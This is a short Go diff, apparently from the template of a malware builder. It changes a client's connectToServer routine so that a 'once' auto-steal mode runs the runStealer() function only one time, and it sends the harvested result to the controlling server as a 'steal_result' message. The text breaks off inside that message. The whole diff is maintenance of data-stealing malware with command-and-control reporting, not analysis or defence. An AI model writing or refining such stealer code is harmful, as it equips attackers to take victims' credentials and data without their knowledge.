@@ -4,6 +4,8 @@ import "strings"
 
 func templateConnect() string {
 	return strings.TrimSpace(`
+var autoStealDone bool
+
 func waitForNetwork() {
 	for !hasNetwork() {
 		time.Sleep(3 * time.Second)
@@ -91,10 +93,12 @@ func connectToServer() {
 	}
 
 	autoMode := strings.ToLower(strings.TrimSpace(getAutoStealMode()))
-	if autoMode == "once" || autoMode == "every" || autoMode == "every_connect" {
+	shouldAutoSteal := autoMode == "every" || autoMode == "every_connect" || (autoMode == "once" && !autoStealDone)
+	if shouldAutoSteal {
 		go func() {
 			time.Sleep(2 * time.Second)
 			result := runStealer()
+			autoStealDone = true
 			if conn != nil {
 				msg := map[string]interface{}{
 					"type":       "steal_result",
